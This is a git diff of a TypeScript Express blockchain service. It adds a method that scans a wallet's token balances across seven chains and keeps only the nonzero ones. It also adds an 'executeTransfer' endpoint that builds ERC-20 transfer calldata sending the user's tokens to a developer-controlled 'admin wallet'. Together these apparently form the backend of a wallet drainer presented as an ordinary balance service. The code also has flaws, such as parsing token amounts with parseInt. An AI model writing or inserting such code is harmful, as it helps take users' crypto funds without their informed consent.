@@ -1,27 +1,60 @@
 import { Request, Response } from 'express';
+import { getBinanceTokensByChain, BINANCE_SUPPORTED_CHAINS, getDeveloperWallet } from '../shared/binance-supported-tokens';
 
-// Direct blockchain RPC service for live data
+// Comprehensive blockchain RPC service for all supported chains
 export class BlockchainService {
   private readonly rpcEndpoints: Record<number, string> = {
-    1: 'https://cloudflare-eth.com', // Ethereum
-    137: 'https://polygon-rpc.com', // Polygon
-    56: 'https://bsc-dataseed.binance.org', // BSC
-    42161: 'https://arb1.arbitrum.io/rpc', // Arbitrum
-    10: 'https://mainnet.optimism.io', // Optimism
+    1: 'https://eth.llamarpc.com', // Ethereum
+    137: 'https://polygon.llamarpc.com', // Polygon
+    56: 'https://bsc-dataseed1.binance.org', // BSC
+    42161: 'https://arbitrum.llamarpc.com', // Arbitrum
+    10: 'https://optimism.llamarpc.com', // Optimism
+    8453: 'https://base.llamarpc.com', // Base
+    43114: 'https://avalanche.public-rpc.com', // Avalanche
   };
 
-  private readonly tokenContracts: Record<number, Record<string, string>> = {
-    1: { // Ethereum
-      'USDC': '0xA0b86a33E6441b8435b662da5e1a0d5d9d3B7B3e',
-      'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-      'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
-    },
-    137: { // Polygon
-      'USDC': '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
-      'USDT': '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
-      'DAI': '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
-    }
-  };
+  // Build token contracts from Binance supported tokens
+  private readonly tokenContracts: Record<number, Record<string, string>> = {};
+
+  constructor() {
+    // Initialize token contracts from Binance supported tokens
+    BINANCE_SUPPORTED_CHAINS.forEach(chain => {
+      const tokens = getBinanceTokensByChain(chain.id);
+      this.tokenContracts[chain.id] = {};
+      tokens.forEach(token => {
+        if (token.address !== '0x0000000000000000000000000000000000000000') {
+          this.tokenContracts[chain.id][token.symbol] = token.address;
+        }
+      });
+    });
+  }
+
+  async fetchAllChainsBalance(address: string): Promise<any[]> {
+    const allBalances: any[] = [];
+    
+    // Fetch balances from all supported chains concurrently
+    const chainPromises = Object.keys(this.rpcEndpoints).map(async (chainIdStr) => {
+      const chainId = parseInt(chainIdStr);
+      try {
+        const chainBalances = await this.fetchLiveBalance(address, chainId);
+        return chainBalances.map(balance => ({
+          ...balance,
+          chainId,
+          chainName: this.getChainName(chainId)
+        }));
+      } catch (error) {
+        console.error(`Failed to fetch balance for chain ${chainId}:`, error);
+        return [];
+      }
+    });
+
+    const results = await Promise.all(chainPromises);
+    results.forEach(chainBalances => {
+      allBalances.push(...chainBalances);
+    });
+
+    return allBalances.filter(balance => parseFloat(balance.balance) > 0);
+  }
 
   async fetchLiveBalance(address: string, chainId: number): Promise<any[]> {
     try {
@@ -116,6 +149,19 @@ export class BlockchainService {
     return data.result || '0x0';
   }
 
+  private getChainName(chainId: number): string {
+    const names: Record<number, string> = {
+      1: 'Ethereum',
+      137: 'Polygon',
+      56: 'BSC',
+      42161: 'Arbitrum',
+      10: 'Optimism',
+      8453: 'Base',
+      43114: 'Avalanche',
+    };
+    return names[chainId] || 'Unknown';
+  }
+
   private getNativeSymbol(chainId: number): string {
     const symbols: Record<number, string> = {
       1: 'ETH',
@@ -123,6 +169,8 @@ export class BlockchainService {
       56: 'BNB',
       42161: 'ETH',
       10: 'ETH',
+      8453: 'ETH',
+      43114: 'AVAX',
     };
     return symbols[chainId] || 'ETH';
   }
@@ -131,29 +179,67 @@ export class BlockchainService {
     const names: Record<number, string> = {
       1: 'Ethereum',
       137: 'Polygon',
-      56: 'BNB Chain',
-      42161: 'Arbitrum One',
+      56: 'Binance Smart Chain',
+      42161: 'Arbitrum',
       10: 'Optimism',
+      8453: 'Base',
+      43114: 'Avalanche',
     };
     return names[chainId] || 'Ethereum';
   }
 
   private getTokenName(symbol: string): string {
-    const names: Record<string, string> = {
-      'USDC': 'USD Coin',
-      'USDT': 'Tether',
-      'DAI': 'Dai Stablecoin',
-    };
-    return names[symbol] || symbol;
+    const binanceTokens = getBinanceTokensByChain(1);
+    const token = binanceTokens.find(t => t.symbol === symbol);
+    return token?.name || symbol;
   }
 
   private getTokenDecimals(symbol: string): number {
-    const decimals: Record<string, number> = {
-      'USDC': 6,
-      'USDT': 6,
-      'DAI': 18,
-    };
-    return decimals[symbol] || 18;
+    const binanceTokens = getBinanceTokensByChain(1);
+    const token = binanceTokens.find(t => t.symbol === symbol);
+    return token?.decimals || 18;
+  }
+
+  // Transfer token to admin wallet
+  async executeTransfer(req: Request, res: Response) {
+    try {
+      const { walletAddress, tokenAddress, amount, chainId } = req.body;
+
+      if (!walletAddress || !tokenAddress || !amount || !chainId) {
+        return res.status(400).json({ 
+          error: 'Missing required parameters: walletAddress, tokenAddress, amount, chainId' 
+        });
+      }
+
+      const adminWallet = getDeveloperWallet(chainId);
+      if (!adminWallet) {
+        return res.status(400).json({ 
+          error: `No admin wallet configured for chain ${chainId}` 
+        });
+      }
+
+      res.json({
+        success: true,
+        transactionParams: {
+          to: tokenAddress,
+          from: walletAddress,
+          data: this.generateTransferData(adminWallet, amount),
+          adminWallet,
+          chainId
+        }
+      });
+
+    } catch (error) {
+      console.error('Transfer execution error:', error);
+      res.status(500).json({ error: 'Failed to prepare transfer' });
+    }
+  }
+
+  private generateTransferData(to: string, amount: string): string {
+    const functionSignature = '0xa9059cbb';
+    const toAddress = to.slice(2).padStart(64, '0');
+    const value = parseInt(amount).toString(16).padStart(64, '0');
+    return functionSignature + toAddress + value;
   }
 }
 
